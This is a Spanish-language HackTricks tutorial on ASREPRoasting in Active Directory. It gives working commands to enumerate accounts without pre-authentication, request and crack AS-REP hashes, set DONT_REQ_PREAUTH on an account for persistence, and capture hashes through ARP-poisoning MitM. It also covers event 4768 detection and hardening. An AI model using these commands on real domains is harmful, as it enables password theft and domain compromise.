# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast es un ataque de seguridad que explota a los usuarios que carecen del atributo **Kerberos pre-authentication required**. En esencia, esta vulnerabilidad permite a los atacantes solicitar la autenticación de un usuario al Domain Controller (DC) sin necesitar la contraseña del usuario. El DC responde entonces con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar crackear offline para descubrir dicha contraseña.

Los requisitos principales para este ataque son:

- **Falta de Kerberos pre-authentication**: Los usuarios objetivo no deben tener habilitada esta función de seguridad.
- **Conexión al Domain Controller (DC)**: Los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
- **Cuenta de dominio opcional**: Tener una cuenta de dominio permite a los atacantes identificar de forma más eficiente a los usuarios vulnerables mediante consultas LDAP. Sin dicha cuenta, los atacantes deben adivinar los nombres de usuario.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Solicitar mensaje AS_REP
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus solicita **RC4** de forma predeterminada, por lo que el Event ID **4768** normalmente muestra **preauth type 0** y **ticket encryption type 0x17**. Si añades **`/aes`** (o RC4 está deshabilitado para el objetivo), espera **AES etypes** en su lugar.<sup>[[2]](#references)</sup>

#### One-liners rápidos (Linux)

- Enumera primero los objetivos potenciales (por ejemplo, a partir de build paths leaked) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Haz roast de una lista completa de usernames sin creds válidas usando NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Si tienes creds, permite que NetExec consulte LDAP y solicite por ti todas las cuentas susceptibles de roast: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Si el output comienza con **`$krb5asrep$23$`**, hazle crack con Hashcat **`-m 18200`**. Si comienza con **`$krb5asrep$17$`** o **`$krb5asrep$18$`**, usa preferiblemente John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

No asumas que todo AS-REP roast usa RC4. Las herramientas modernas pueden devolver **RC4** (`$krb5asrep$23$`) o **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), según el enctype solicitado/negociado. **`hashcat -m 18200`** es para **etype 23**, mientras que **John** gestiona `krb5asrep` directamente para **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistencia

Forzar **preauth** no requerido para un usuario sobre el que tienes permisos **GenericAll** (o permisos para escribir propiedades):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Detección y hardening

Un roast exitoso produce un evento **4768** en el DC con `Status=0x0` y `PreAuthType=0`. No exijas RC4 en la detección: `TicketEncryptionType=0x17` es una señal útil de cifrado débil, pero un atacante puede solicitar AES (valores del registro de eventos `0x11`/`0x12`). En Windows Server 2016 y versiones posteriores con la actualización acumulativa del 14 de enero de 2025 (o posterior), la versión 2 del evento 4768 también expone `ClientAdvertizedEncryptionTypes`, los etypes compatibles con la cuenta/DC y las claves disponibles.<sup>[[5]](#references)</sup>

Una búsqueda práctica detecta cuando un cliente anuncia únicamente RC4 mientras la cuenta tiene claves AES, y luego correlaciona ráfagas desde una misma dirección IP de origen a través de varios usuarios sin preautenticación. Establece una línea base de las excepciones legítimas en lugar de generar alertas para cada evento con `PreAuthType=0`.

La solución duradera consiste en desmarcar **Do not require Kerberos preauthentication** en todos los usuarios que no lo necesiten estrictamente y rotar las contraseñas de las cuentas expuestas. Si no se puede eliminar una excepción, utiliza una contraseña larga generada aleatoriamente y privilegios mínimos. Deshabilitar RC4 aumenta el coste del cracking, pero no elimina la posibilidad de roast, ya que las respuestas AS-REP con AES siguen siendo vulnerables al cracking offline.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast sin credenciales

Un atacante on-path puede capturar el AS-REP devuelto durante un intercambio AS normal con preautenticación y formatear su parte cifrada para realizar cracking offline. A diferencia del ASREPRoasting clásico, esto no requiere `DONT_REQ_PREAUTH`; sin embargo, solo permite obtener las cuentas cuyo intercambio de Kerberos se intercepte realmente. **ASRepCatcher** obtiene la posición mediante envenenamiento ARP unidireccional de forma predeterminada, o puede consumir tráfico de otra técnica MitM con `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Si quieres conocer el truco relacionado sin credenciales que devuelve un **service ticket** en lugar de un **TGT** desde un principal sin preautenticación, consulta [Kerberoast](kerberoast.md).

En modo `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) reenvía los AS-REQ interceptados y fuerza **RC4** cuando ambos lados todavía lo permiten. `listen` no altera los paquetes y, por tanto, captura el enctype que el cliente y el DC hayan negociado. Limita el envenenamiento con `-t`/`-tf` en lugar de afectar a toda la subred cuando sea posible.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Evento 4768: Se solicitó un ticket de autenticación de Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
